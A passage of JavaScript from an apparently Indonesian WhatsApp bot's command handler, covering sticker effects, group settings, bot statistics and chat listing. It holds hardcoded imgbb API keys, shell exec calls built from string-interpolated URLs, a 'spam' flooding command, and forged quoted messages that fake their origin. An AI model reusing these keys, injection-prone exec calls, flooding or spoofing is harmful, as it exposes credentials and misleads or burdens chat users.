menusimple = false
reply(`_Succses mengganti menu ke menu ori_`)
} else if((args[0]) == 'simple'){
menusimple = true
Mloc = false
reply(`_Succses mengganti menu ke menu simple_`)
} else {
reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
}
break
case 'setlang':
         if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if(args[0] == 'ind'){
lang = ind
reply('Sukses mengubah bahasa ke ind')
}else if(args[0] == 'eng'){
lang = eng
reply('Success changing language to eng')
}else if(args[0] == 'es'){
lang = es
reply('Éxito cambiando el idioma a es')
}else if(args[0] == 'ml'){
lang = ml
reply('ഭാഷയിലേക്ക് മാറ്റുന്നതിൽ വിജയം ml')
}else if(args[0] == 'pt'){
lang = pt
reply('Sucesso ao alterar o idioma para pt')
}else if(args[0] == 'ru'){
lang = ru
reply('Успешно сменил язык на ru')
}else {
reply(`Example : ${prefix + command} eng\n\nAvailable\n•ind - Indonesia\n•eng - English\n•es - Spanish\n•ml - Malayalam\n•pt - Portugis\n•ru - Russian`)
}
break
                case 'allmenu':
                let papao = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										},{
										"buttonId": 'Command',
										"buttonText": {
											"displayText": "LIST MESSAGE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, allmenu(prefix, wita, wit, ucapannya2 , timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat), `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papao, {})
                break
        case 'trigger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 
	                 owgi = await alpha.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					alpha.sendMessage(from, buffer, image, {caption : lang.success(),quoted: mek})
                   }
              break       
				
		case 'gay':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'glass':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'passed':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'jail':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'comrade':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'hijau':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'biru':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 break 
		case 'greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert_greyscale':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'red':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
         case 'blurple':
         
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'blurple2':
		
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'wasted':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'pelangi':
		case 'rainbow':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'sepia':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await  alpha.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
					case 'jadian':
jds = []
jdii = groupMembers
koss = groupMembers
akuu = jdii[Math.floor(Math.random() * jdii.length)]
diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
break
   case 'group': 
   case 'gc': 
                if (!isGroup) return reply(lang.onlygc());
        if (!isGroupAdmins && !isBotGroupAdmins) return reply(lang.onlygcAdmin());
        if (args[0] == "open") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					fakegroup('S U C C E S S  O P E N I N G  G R O U P')
        } else if (args[0] == "close") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					fakegroup('S U C C E S S  C L O S I N G  G R O U P')
        } else if (!q) {
        	var ini_gopayy =`Halo @${sender.split("@")[0]} Gunakan ${prefix + command } Open / Close jika button tidak merespon`
var buttonss = [
{buttonId: 'group open', buttonText:{displayText: 'Open'}, type: 1},
{buttonId: 'group close', buttonText:{displayText: 'Close'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftroli,sendEphemeral: true 
			})
        }
        break
            case 'mystat': 
            case 'botstat': 
            case 'botstatus': 
			case 'mystatus':
				anu = process.uptime()
                teskny = `B O T  S T A T I S T I C\n`
				teskny +=`\`\`\`Group Chat : ${giid.length}\`\`\`\n`
				teskny +=`\`\`\`Personal Chat : ${totalchat.length - giid.length}\`\`\`\n`
				teskny +=`\`\`\`Total Chat : ${totalchat.length}\`\`\`\n`
				teskny +=`\`\`\`Speed :\`\`\` ${latensii.toFixed(4)} _Second_\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\`\n\n` 
				teskny +=`P H O N E  S T A T I S T I C\n`
				teskny +=`\`\`\`Wa Whatsapp : ${wa_version}\`\`\`\n`
				teskny +=`\`\`\`RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`\n`
				teskny +=`\`\`\`MCC : ${mcc}\`\`\`\n`
				teskny +=`\`\`\`MNC : ${mnc}\`\`\`\n`
				teskny +=`\`\`\`OS Version : ${os_version}\`\`\`\n`
				teskny +=`\`\`\`Merk Hp : ${device_manufacturer}\`\`\`\n`
				teskny +=`\`\`\`Versi Hp : ${device_model}\`\`\`\n`
				teskny +=`\`\`\`Runtime : ${kyun(anu)}\`\`\``
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case 'getbio':
				if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentionedd = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentionedd}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply(lang.onlygc())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
		case 'caripesan':
		    case 'searchmessage':
				if (!q) return reply(`Penggunaan ${command} _nama pesannya_\n\nContoh \n --> ${command} halo`)
				reply(lang.wait())
				 xtext = args.join(' ')
				                cond = xtext.split(" ")
				                 a = await alpha.searchMessages(xtext, from, 10, 1)// count 10 
				                 fox = '*「 Message Search 」*\n\n'
				                num = 0
				                for (j of a.messages){
				                    num += 1
				                    if (j.message.conversation) {
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        } 
				                    }
				                    else if (j.message.extendedTextMessage){
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        } 
				                    }
				                }
				                reply(fox)
		                break
case 'setname':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.otNotAdm())
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup my', text, { quoted: fdoc })
					break 
case 'setdesc':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fdoc })
					break   
case 'spam':
if (!isGroup) return reply(lang.onlygc())
				if (!isGroupAdmins) return reply(lang.onlygcAdmin())
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = args.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				break 
case 'readall':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					reply(rdl)
					console.log(chats.length)
					break
case 'listpc':
					  if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nTOTAL PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Name : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case 'listgroup':
case 'listgrup':
case 'listgc':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
const txs = alpha.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${alpha.getName(v.jid)}${enter}${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`${enter}~~${enter}`
alpha.sendMessage(m.chat, '```「 LIST GROUPS 」```\n\n' + txs, text)
break
				   break 
case 'bcsticker':
case 'bcstik':
